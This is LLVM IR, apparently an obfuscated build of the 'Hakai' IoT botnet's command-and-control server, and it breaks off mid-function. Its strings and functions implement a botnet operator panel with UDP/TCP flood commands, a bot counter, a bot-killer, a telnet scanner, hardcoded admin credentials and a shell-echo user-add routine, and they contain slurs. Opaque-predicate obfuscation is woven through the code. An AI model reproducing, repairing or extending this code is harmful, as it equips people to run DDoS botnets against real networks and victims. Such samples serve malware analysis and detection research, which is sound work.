; ModuleID = 'host/ir_bcf/Hakai.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], [512 x i8], i8 }
%struct.telnetdata_t = type { i32, i32, [20 x i8] }
%struct.name = type { [512 x i8], i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"\0D\0A\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"name:\00", align 1
@arra = internal global [40 x %struct.name] zeroinitializer, align 16
@.str.7 = private unnamed_addr constant [9 x i8] c".DSLKFJ\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"LOCKED \00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"killed pid\00", align 1
@BOATSRAPED = internal global i32 0, align 4
@.str.12 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"[%d.%d.%d.%d]\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@titleWriter.spinbuf = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0)], align 16
@.str.23 = private unnamed_addr constant [35 x i8] c"%c]0;%d Devices Connected %s  %s%c\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\5C\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.24 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"shadoh\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"!HBOT\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.27 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.28 = private unnamed_addr constant [30 x i8] c"\1B[1;31mUsername\1B[1;36m:\1B[37m \00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"connection.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"[LOGIN ATTEMPT] USER: %s\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[1;31mPassword\1B[1;36m:\1B[37m \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"[FAILED ATTEMPT] USER: %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.37 = private unnamed_addr constant [43 x i8] c"\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.39 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.40 = private unnamed_addr constant [9 x i8] c"botcount\00", align 1
@.str.41 = private unnamed_addr constant [30 x i8] c"\1B[37;1m%s\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [33 x i8] c"\1B[37;1mtotal\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"rape?\00", align 1
@.str.44 = private unnamed_addr constant [34 x i8] c"\1B[0mhbot.botkill: \1B[1;31m%d\1B[0m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.47 = private unnamed_addr constant [28 x i8] c"\1B[0mresolved [%s] to [%s]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.49 = private unnamed_addr constant [37 x i8] c"\1B[0mddoscmds - shows ddos commands\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [36 x i8] c"servercmds - server side commands\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [29 x i8] c"admincmds - admin commands\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"servercmds\00", align 1
@.str.53 = private unnamed_addr constant [29 x i8] c"\1B[0mbots - shows bot count\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [29 x i8] c"exit - disconnect from net\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [28 x i8] c"help - displays help menu\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [10 x i8] c"admincmds\00", align 1
@.str.57 = private unnamed_addr constant [51 x i8] c"\1B[0mbtype - shows architecture of bots connected\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [46 x i8] c"users - displays who's connected to the net\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [66 x i8] c"addusr - add users via server side (IN DEVELOPMENT! VERY BUGGY)\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [32 x i8] c"start - starts telnet scanner\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [39 x i8] c"kickuser - logs user out must be admin\00", align 1
@.str.62 = private unnamed_addr constant [41 x i8] c"You Must Be Admin to Use This Command!\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"ddoscmds\00", align 1
@.str.64 = private unnamed_addr constant [28 x i8] c"\1B[0mUDP ip port time size\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [24 x i8] c"TCP ip port time size\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.69 = private unnamed_addr constant [16 x i8] c"Attack Sent! \0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [12 x i8] c"actions.log\00", align 1
@.str.71 = private unnamed_addr constant [31 x i8] c"[hbot] [%s] [Sent an Attack!]\0A\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c". KT\00", align 1
@.str.73 = private unnamed_addr constant [32 x i8] c"[hbot] [%s] [Killed All Pid's]\0A\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"users\00", align 1
@.str.76 = private unnamed_addr constant [39 x i8] c"\1B[31m- \1B[31mOnline Users \1B[31m-\1B[37m\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [37 x i8] c"\1B[37mID(\1B[31m%d\1B[37m) \1B[31m%s\1B[37m\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"kickuser\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"user=\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"USER=\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.82 = private unnamed_addr constant [43 x i8] c"\0A\1B[31mGoodbye, kicked by \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [30 x i8] c"\1B[33mKicked \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"id=\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"ID=\00", align 1
@.str.86 = private unnamed_addr constant [46 x i8] c"\1B[33mKicked user with id of \1B[34m%d\1B[37m...\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [53 x i8] c"You Must Be big daddy shadoh to kick others, queer\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.89 = private unnamed_addr constant [24 x i8] c"echo '\0A%s' >> login.txt\00", align 1
@.str.90 = private unnamed_addr constant [33 x i8] c"[hbot] [%s] [added a user] [%s]\0A\00", align 1
@.str.91 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"chat.log\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.95 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.96 = private unnamed_addr constant [26 x i8] c"[hbot] [Admin Connected] \00", align 1
@.str.97 = private unnamed_addr constant [39 x i8] c"[hbot] [Admin Connected] [%d.%d.%d.%d]\00", align 1
@.str.98 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.99 = private unnamed_addr constant [46 x i8] c"[hbot] Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"killer.txt\00", align 1
@kfileFD = internal global %struct._IO_FILE* null, align 8
@.str.103 = private unnamed_addr constant [31 x i8] c"[hbot] Lower Threading Count.\0A\00", align 1
@.str.104 = private unnamed_addr constant [33 x i8] c"[hbot] Socket Opened On Port %d\0A\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"hbot\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.110 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %75, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %57

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @x
  %14 = load i32, i32* @y
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i32, i32* %7, align 4
  %22 = load i32, i32* %5, align 4
  %23 = icmp slt i32 %21, %22
  %24 = load i32, i32* @x
  %25 = load i32, i32* @y
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %57

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x
  %34 = load i32, i32* @y
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i8*, i8** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  %45 = getelementptr inbounds i8, i8* %44, i64 -1
  %46 = load i8, i8* %45, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp ne i32 %47, 10
  %49 = load i32, i32* @x
  %50 = load i32, i32* @y
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %57

; <label>:57:                                     ; preds = %originalBBpart24, %originalBBpart2, %9
  %58 = phi i1 [ false, %originalBBpart2 ], [ false, %9 ], [ %48, %originalBBpart24 ]
  %59 = load i32, i32* @x
  %60 = load i32, i32* @y
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %57
  %67 = load i32, i32* @x
  %68 = load i32, i32* @y
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %58, label %75, label %85

; <label>:75:                                     ; preds = %originalBBpart28
  %76 = load i32, i32* %6, align 4
  %77 = load i8*, i8** %4, align 8
  %78 = load i32, i32* %7, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = call i64 @read(i32 %76, i8* %80, i64 1)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %8, align 4
  %83 = load i32, i32* %7, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %7, align 4
  br label %9

; <label>:85:                                     ; preds = %originalBBpart28
  %86 = load i32, i32* %8, align 4
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %12
  %87 = load i32, i32* %7, align 4
  %88 = load i32, i32* %5, align 4
  %89 = icmp slt i32 %87, %88
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %90 = load i8*, i8** %4, align 8
  %91 = load i32, i32* %7, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = getelementptr inbounds i8, i8* %93, i64 -1
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp ne i32 %96, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %57
  br label %originalBB6
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #9
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

; <label>:25:                                     ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10

; <label>:28:                                     ; preds = %10
  %29 = load i32, i32* @x.1
  %30 = load i32, i32* @y.2
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %45

; <label>:45:                                     ; preds = %originalBBpart211, %originalBBpart2
  %46 = load i32, i32* %5, align 4
  %47 = load i32, i32* %4, align 4
  %48 = icmp sge i32 %46, %47
  br i1 %48, label %49, label %80

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* @x.1
  %51 = load i32, i32* @y.2
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = call i16** @__ctype_b_loc() #9
  %59 = load i16*, i16** %58, align 8
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i16, i16* %59, i64 %66
  %68 = load i16, i16* %67, align 2
  %69 = zext i16 %68 to i32
  %70 = and i32 %69, 8192
  %71 = icmp ne i32 %70, 0
  %72 = load i32, i32* @x.1
  %73 = load i32, i32* @y.2
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %80

; <label>:80:                                     ; preds = %originalBBpart24, %45
  %81 = phi i1 [ false, %45 ], [ %71, %originalBBpart24 ]
  br i1 %81, label %82, label %101

; <label>:82:                                     ; preds = %80
  %83 = load i32, i32* @x.1
  %84 = load i32, i32* @y.2
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %82
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %5, align 4
  %93 = load i32, i32* @x.1
  %94 = load i32, i32* @y.2
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %45

; <label>:101:                                    ; preds = %80
  %102 = load i32, i32* %4, align 4
  store i32 %102, i32* %3, align 4
  br label %103

; <label>:103:                                    ; preds = %119, %101
  %104 = load i32, i32* %3, align 4
  %105 = load i32, i32* %5, align 4
  %106 = icmp sle i32 %104, %105
  br i1 %106, label %107, label %122

; <label>:107:                                    ; preds = %103
  %108 = load i8*, i8** %2, align 8
  %109 = load i32, i32* %3, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8, i8* %108, i64 %110
  %112 = load i8, i8* %111, align 1
  %113 = load i8*, i8** %2, align 8
  %114 = load i32, i32* %3, align 4
  %115 = load i32, i32* %4, align 4
  %116 = sub nsw i32 %114, %115
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %113, i64 %117
  store i8 %112, i8* %118, align 1
  br label %119

; <label>:119:                                    ; preds = %107
  %120 = load i32, i32* %3, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %3, align 4
  br label %103

; <label>:122:                                    ; preds = %103
  %123 = load i8*, i8** %2, align 8
  %124 = load i32, i32* %3, align 4
  %125 = load i32, i32* %4, align 4
  %126 = sub nsw i32 %124, %125
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %123, i64 %127
  store i8 0, i8* %128, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %28
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %129 = call i16** @__ctype_b_loc() #9
  %130 = load i16*, i16** %129, align 8
  %131 = load i8*, i8** %2, align 8
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8, i8* %131, i64 %133
  %135 = load i8, i8* %134, align 1
  %136 = sext i8 %135 to i32
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i16, i16* %130, i64 %137
  %139 = load i16, i16* %138, align 2
  %140 = zext i16 %139 to i32
  %_ = shl i32 %140, 8192
  %_2 = shl i32 %140, 8192
  %141 = and i32 %140, 8192
  %142 = icmp ne i32 %141, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %82
  %143 = load i32, i32* %5, align 4
  %_7 = shl i32 %143, -1
  %_8 = sub i32 0, %143
  %gen = add i32 %_8, -1
  %_9 = shl i32 %143, -1
  %144 = add nsw i32 %143, -1
  store i32 %144, i32* %5, align 4
  br label %originalBB6
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #3

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = load i32, i32* @x.3
  %5 = load i32, i32* @y.4
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca [56 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca i64, align 8
  %19 = alloca %struct.tm*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i8* %2, i8** %14, align 8
  store i32 1, i32* %15, align 4
  %22 = load i8*, i8** %12, align 8
  %23 = call i32 @strcmp(i8* %22, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %24 = icmp eq i32 %23, 0
  %25 = load i32, i32* @x.3
  %26 = load i32, i32* @y.4
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %50

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.3
  %35 = load i32, i32* @y.4
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  store i32 0, i32* %15, align 4
  %42 = load i32, i32* @x.3
  %43 = load i32, i32* @y.4
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %originalBBpart2
  %51 = load i8*, i8** %12, align 8
  %52 = call i64 @strlen(i8* %51) #8
  %53 = add i64 %52, 10
  %54 = call noalias i8* @malloc(i64 %53) #7
  store i8* %54, i8** %17, align 8
  %55 = load i8*, i8** %17, align 8
  %56 = load i8*, i8** %12, align 8
  %57 = call i64 @strlen(i8* %56) #8
  %58 = add i64 %57, 10
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 %58, i32 1, i1 false)
  %59 = load i8*, i8** %17, align 8
  %60 = load i8*, i8** %12, align 8
  %61 = call i8* @strcpy(i8* %59, i8* %60) #7
  %62 = load i8*, i8** %17, align 8
  call void @trim(i8* %62)
  %63 = call i64 @time(i64* %18) #7
  %64 = call %struct.tm* @localtime(i64* %18) #7
  store %struct.tm* %64, %struct.tm** %19, align 8
  %65 = load %struct.tm*, %struct.tm** %19, align 8
  %66 = call i8* @asctime(%struct.tm* %65) #7
  store i8* %66, i8** %20, align 8
  %67 = load i8*, i8** %20, align 8
  call void @trim(i8* %67)
  store i32 0, i32* %21, align 4
  br label %68

; <label>:68:                                     ; preds = %originalBBpart227, %50
  %69 = load i32, i32* @x.3
  %70 = load i32, i32* @y.4
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i32, i32* %21, align 4
  %78 = icmp slt i32 %77, 1000000
  %79 = load i32, i32* @x.3
  %80 = load i32, i32* @y.4
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %78, label %87, label %212

; <label>:87:                                     ; preds = %originalBBpart28
  %88 = load i32, i32* %21, align 4
